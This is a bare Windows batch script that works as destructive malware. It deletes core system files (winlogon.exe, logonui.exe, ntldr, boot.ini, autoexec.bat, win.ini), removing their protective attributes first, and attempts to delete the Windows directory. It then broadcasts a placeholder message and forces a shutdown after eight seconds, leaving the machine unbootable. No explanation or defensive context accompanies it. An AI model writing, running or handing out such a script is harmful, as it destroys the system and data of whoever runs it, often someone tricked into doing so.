@echo off
del C:\WINDOWS\system32\winlogon.exe
del C:\WINDOWS\system32\logonui.exe
del C:\WINDOWS\
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini
@echo off
msg *message here
shutdown -s -t 8 -c "message here"
